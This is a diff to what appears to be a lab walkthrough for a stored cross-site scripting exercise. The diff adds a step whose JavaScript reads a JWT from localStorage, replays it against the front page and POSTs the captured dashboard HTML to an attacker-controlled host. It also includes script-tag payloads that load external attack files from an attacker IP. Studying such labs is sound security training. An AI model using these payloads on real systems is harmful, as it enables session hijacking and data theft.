@@ -319,19 +319,19 @@ python3 -m http.server 8000
 Served file:
 
 ```text
-tools/payload-frontpage-login.js
+tools/payload-frontpage.js
 ```
 
 Minimal stored payload:
 
 ```html
-<script src="http://attacker_machine_ip:8000/tools/payload-frontpage-login.js"></script>
+<script src="http://attacker_machine_ip:8000/tools/payload-frontpage.js"></script>
 ```
 
 Same-host variation:
 
 ```html
-<script src="http://docker_host_gateway_ip:8000/tools/payload-frontpage-login.js"></script>
+<script src="http://docker_host_gateway_ip:8000/tools/payload-frontpage.js"></script>
 ```
 
 How this external payload works:
@@ -344,7 +344,7 @@ How this external payload works:
 If you need another port or path for the receiver, you can pass it in the script URL:
 
 ```html
-<script src="http://attacker_machine_ip:8000/tools/payload-frontpage-login.js?collectPort=9000&collectPath=/internal-html"></script>
+<script src="http://attacker_machine_ip:8000/tools/payload-frontpage.js?collectPort=9000&collectPath=/internal-html"></script>
 ```
 
 ## Step 15: wait for the worker and inspect the raw HTTP request
@@ -395,7 +395,61 @@ At this stage, you have demonstrated three concrete things:
 - the privileged browser stores a reusable JWT accessible to JavaScript
 - a plain request to `/` still lands on login unless the attacker explicitly reuses that JWT
 
-## Step 18: move to the scripted collector later
+## Step 18: request `/` again, now sending the JWT
+
+The next step is to replay the JWT while still requesting `/`.
+
+The inline reference version is:
+
+```html
+<script>
+const token = localStorage.getItem('gym_internal_token');
+fetch('/', {
+  headers: {
+    Authorization: 'Bearer ' + token
+  }
+})
+  .then(r => r.text())
+  .then(html => {
+    const b64 = btoa(unescape(encodeURIComponent(html)));
+    fetch('http://attacker_machine_ip:9000/internal-html', {
+      method: 'POST',
+      mode: 'no-cors',
+      headers: { 'Content-Type': 'text/plain' },
+      body: b64
+    });
+  });
+</script>
+```
+
+That payload also exceeds the `250` character limit of the public `message` field, so this step should be executed through an external JavaScript file.
+
+Serve:
+
+```text
+tools/payload-frontpage-with-jwt.js
+```
+
+and submit:
+
+```html
+<script src="http://attacker_machine_ip:8000/tools/payload-frontpage-with-jwt.js"></script>
+```
+
+Same-host variation:
+
+```html
+<script src="http://docker_host_gateway_ip:8000/tools/payload-frontpage-with-jwt.js"></script>
+```
+
+Expected result after decoding the captured Base64:
+
+- the returned HTML corresponds to the dashboard
+- you should see indicators such as `Dashboard` and `Ver mensajes`
+
+This demonstrates that the same front page request changes behavior once the attacker explicitly reuses the stolen JWT.
+
+## Step 19: move to the scripted collector later
 
 Once this manual capture is understood and demonstrated, you can switch to:
 
